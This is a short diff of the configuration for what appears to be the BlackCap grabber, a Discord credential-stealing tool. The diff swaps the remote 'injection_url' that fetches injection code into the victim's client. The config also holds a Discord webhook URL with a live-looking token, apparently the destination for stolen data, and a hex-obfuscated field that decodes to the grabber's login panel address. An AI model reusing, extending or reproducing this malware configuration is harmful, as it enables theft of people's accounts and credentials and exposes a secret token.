@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://github.com/Kaserkas/infos/blob/main/index.js",
     webhook: "https://discord.com/api/webhooks/1087767582439915570/lMNVe9rihj7YNEh1QFm683lpQ0rXojL66KaPZC4R1HuHPc8oSZ9718nJafPBYKxDT-L-",
     uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
     Filter: {
